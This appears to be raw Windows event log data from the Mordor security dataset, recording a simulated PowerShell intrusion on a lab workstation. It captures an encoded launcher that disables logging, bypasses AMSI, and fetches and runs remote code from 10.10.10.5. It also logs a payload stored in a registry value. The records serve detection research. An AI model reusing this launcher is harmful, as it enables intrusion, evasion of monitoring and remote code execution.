{"Task":12,"EventReceivedTime":"2020-07-22 00:19:05","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-07-22 04:19:03.931\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:19:03.931","@timestamp":"2020-07-22T04:19:05.130Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"OpcodeValue":0,"EventType":"CreateKey","EventTime":"2020-07-22 00:19:03","Severity":"INFO","EventID":12,"ThreadID":6244,"RecordNumber":1782144}
{"Task":106,"EventReceivedTime":"2020-07-22 00:19:05","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0001-C312-9D81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$a9486.Headers.Add($_.Name, $_.Value)\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$a9486.Headers.Add($_.Name, $_.Value)\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11329\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11329\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:19:05.130Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8748}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"51073","FilterRTID":"71481","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:19:05","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.39.5","ProcessId":"9076","DestAddress":"10.10.10.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t9076\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t51073\r\n\tDestination Address:\t10.10.10.5\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71481\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:19:05.131Z","LayerRTID":"48","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:19:03","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":3276,"RecordNumber":258660}
{"Task":12807,"EventReceivedTime":"2020-07-22 00:19:05","Opcode":"Info","port":55069,"TargetHandleId":"0x3fd4","SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1104","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","SourceProcessId":"0x2374","TargetProcessId":"0x4","Version":0,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SubjectUserName":"pgustavo","SourceName":"Microsoft-Windows-Security-Auditing","ProcessId":"0x2374","Channel":"Security","SourceModuleName":"eventlog","Message":"An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x24579A8\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x1184\r\n\tSource Process ID:\t0x2374\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0x3fd4\r\n\tTarget Process ID:\t0x4","Category":"Handle Manipulation","SubjectDomainName":"MORDOR","@timestamp":"2020-07-22T04:19:05.132Z","Hostname":"WORKSTATION5.mordor.local","SubjectLogonId":"0x24579a8","host":"wec.internal.cloudapp.net","SourceHandleId":"0x1184","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:19:04","Severity":"INFO","EventID":4690,"ThreadID":3276,"RecordNumber":258661}
{"Task":13,"EventReceivedTime":"2020-07-22 00:19:05","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":2,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"9076","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug","Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-07-22 04:19:04.103\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug\r\nDetails: SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDA